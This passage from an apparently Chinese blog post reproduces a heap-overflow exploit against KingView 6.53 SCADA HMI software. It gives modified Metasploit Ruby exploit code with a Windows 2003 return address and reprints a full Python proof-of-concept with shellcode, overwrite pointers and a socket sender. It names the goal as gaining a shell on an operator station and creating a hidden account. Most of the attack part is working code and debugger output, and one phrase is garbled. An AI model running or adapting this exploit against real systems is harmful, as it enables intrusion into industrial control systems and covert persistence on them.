2\n```\n\n![截屏2019-10-15下午8.04.47](https://tva1.sinaimg.cn/large/006y8mN6ly1g7z82ue9dhj31g30suqv5.jpg)\n\n​\t\t再次攻击后，在memory中查找定位字符串位置 ABCA，如下图所示。（图中为我第一次设置的标志值ABCD，方法相同）\n\n![截屏2019-10-15下午7.29.11](https://tva1.sinaimg.cn/large/006y8mN6ly1g7z846kebnj31g30suwht.jpg)\n\n​\t\t可以看到“ABCA”字符串在地址 0x00CD04C0 位置，并且䏰ᰡyload需要在此基础上加4个字节，其实位置在 0x00CD04C4。\n\n![截屏2019-10-15下午8.08.37](https://tva1.sinaimg.cn/large/006y8mN6ly1g7z8551rqjj31g30su0w1.jpg)\n\n​\t\t需根据上步骤定位出的 shellcode 位置来调整 Ret 的值，使得 eax + 0xC 指向输入数据包中的某个 4 字节数据。定位字符“ABCA”位 置是 0x00CD04C0，减去 0xC 得到 eax 寄存器的值为 0x00CD04C4，所以 Ret 的值为 0x00CD04C4。修改后的利用程序代码如下所示:\n\n```ruby\nelsif target.name =~ /2003 SP0/\n\t\t\n\t\t\n\t\tsploit << make_nops(1020)\n\t\tsploit << \"\\xC4\\x04\\xB4\\x00\"\n\t\tsploit << payload.encoded\n\t\tsploit << \"\\x44\"*(31752-payload.encoded.length)\n\t\tsploit << [target.ret].pack('V')\n\t\t\n\t\t\nend\n```\n\n​\t\t再次利用可成功通过漏洞获取系统权限。\n\n![截屏2019-10-15下午8.31.37](https://tva1.sinaimg.cn/large/006y8mN6ly1g7z89ajgtjj31g30su4qq.jpg)\n\n## **预期结果**\n\n​\t\t成功获取win 2003 操作员站的shell，并可以在操作员站建立隐蔽账号。\n\n## PLUS\n\n​\t\t尝试通过Python脚本的方式进行 EXP 编写进行手工测试。\n\n​\t\t下面给出一个参考：\n\n```python\n## Exploit Title: KingView 6.53 SCADA HMI Heap Overflow PoC\n## Date: 9/28/2010\n## Author: Dillon Beresford\n## Software Link: http://download.kingview.com/software/kingview%20English%20Version/kingview6.53_EN.rar\n## Version: 6.53 (English)\n## Tested on: Windows XP SP1 ( works on SP2 and SP3 ) will release new targets after CERT advisory is public. \n\n## Shouts to HD Moore JDuck, Egyp7, todb, |)ruid, nate and the rest of the AHA! crew.\n## Thanks to all who share knowledge about heap smashing and heap bypass techniques.\n\n## Notified CERT and the vendor, CERT notified the vendor as well, vendor never responded.\n## No patch or response from vendor as of 1/9/2011\n## Lets get this into the wild and see how long it takes them to respond.\n\n## Looks like persistence pays off. :-)\n\n## SP2/SP3 targets will be available soon. (putting into metasploit this is just a poc to get response from vendor).\n## Vendor: Beijing WellinControl Technology Development Co.,Ltd \n## http://www.wellintek.com\n\n## Beijing WellinControl Technology Development and CHINA CERT were notified on Tue, Sep 28, 2010 at 6:31 AM\n## I have made every attempt and yet they choose to ignore...\n## This PoC should wake up the dragon. >:-]\n## With more to come!\n\n## KingView software is a high-pormance production which can be used to building a data information \n## service platform in automatic field. KingView software can provid graphic visualization which takes \n## your operations management, control and optimization . KingView is widely used in power, \n## water conservancy,buildings, coalmine, environmental protection, metallurgy and so on. \n## And now KingView software is used in national defense, Aero-Space in China. \n\n## Notes: The HistorySrv process listens on TCP port 777 \n## This process does not require any authentication from clients\n\n## An attacker could replace the Flink and Blink pointers with evil ones.. Herrow srweeping dragon. \n\n## Windows XP SP1 (x86) \n## CommandLine: \"C:\\Program Files\\Kingview\\HistorySvr.exe\"\n## eax=00241eb4 ebx=7ffdf000 ecx=00000003 edx=77f6eb08 esi=00241eb4 edi=00241f48\n## eip=77f767cd esp=0012fb38 ebp=0012fc2c iopl=0         nv up ei pl nz na po nc\n## cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202\n## ntdll!DbgBreakPoint:\n## 77f767cd cc              int     3\n## 0:000> g\n## ModLoad: 71950000 71a34000   C:\\WINDOWS\\WinSxS\\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.10.0_x-ww_f7fb5805\\comctl32.dll\n## ModLoad: 5ad70000 5ada4000   C:\\WINDOWS\\System32\\uxtheme.dll\n## ModLoad: 71a50000 71a8b000   C:\\WINDOWS\\system32\\mswsock.dll\n## ModLoad: 71a90000 71a98000   C:\\WINDOWS\\System32\\wshtcpip.dll\n## (318.6d4): Access violation - code c0000005 (first chance)\n## First chance exceptions are reported before any exception handling.\n## This exception may be expected and handled.\n## eax=42424242 ebx=00000285 ecx=44444444 edx=00d38110 esi=00d38110 edi=003a0000\n## eip=77f6256f esp=0012f36c ebp=0012f584 iopl=0         nv up ei pl zr na pe nc\n## cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00010246\n## ntdll!RtlAllocateHeapSlowly+0x6bd:\n## 77f6256f 8901            mov     dword ptr [ecx],eax  ds:0023:44444444=????????\n## 0:000> u\n## ntdll!RtlAllocateHeapSlowly+0x6bd:\n## 77f6256f 8901            mov     dword ptr [ecx],eax\n## 77f62571 894804          mov     dword ptr [eax+4],ecx\n## 77f62574 3bc1            cmp     eax,ecx\n## 77f62576 7534            jne     ntdll!RtlAllocateHeapSlowly+0x6fa (77f625ac)\n## 77f62578 668b06          mov     ax,word ptr [esi]\n## 77f6257b 663d8000        cmp     ax,80h\n## 77f6257f 732b            jae     ntdll!RtlAllocateHeapSlowly+0x6fa (77f625ac)\n## 77f62581 0fb7c8          movzx   ecx,ax\n\n\n## usage python exploit.py 127.0.0.1 777\n\nimport os\nimport socket\nimport sys\n\nhost = sys.argv[1]\nport = int(sys.argv[2])\n\nprint \" KingView 6.53 SCADA HMI Heap Smashing Exploit \"\nprint \" Credits: D1N | twitter.com/D1N \"\n\nshellcode = (\"\\x33\\xC0\\x50\\x68\\x63\\x61\\x6C\\x63\\x54\\x5B\\x50\\x53\\xB9\"\n\"\\x44\\x80\\xc2\\x77\" \n\"\\xFF\\xD1\\x90\\x90\") \n\nexploit = (\"\\x90\" * 1024 + \"\\x44\" * 31788) \nexploit += (\"\\xeb\\x14\") # our JMP (over the junk and into nops) \nexploit += (\"\\x44\" * 6) \nexploit += (\"\\xad\\xbb\\xc3\\x77\") # ECX 0x77C3BBAD --> call dword ptr ds:[EDI+74] \nexploit += (\"\\xb4\\x73\\xed\\x77\") # EAX 0x77ED73B4 --> UnhandledExceptionFilter() \nexploit += (\"\\x90\" * 21) \nexploit += shellcode\n\nprint \"  [+] Herrow Sweeping Dragon...\"\nprint \"  [+] Sending payload...\"\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  \ns.connect((host,port)) \ns.send(exploit)  \ndata = s.recv(1024)\n\nprint \"  [+] Closing connection..\" \ns.close()  \nprint \"  [+] Done!\" \n```\n\n","tags":["漏洞复现"],"categories":["工控"]}]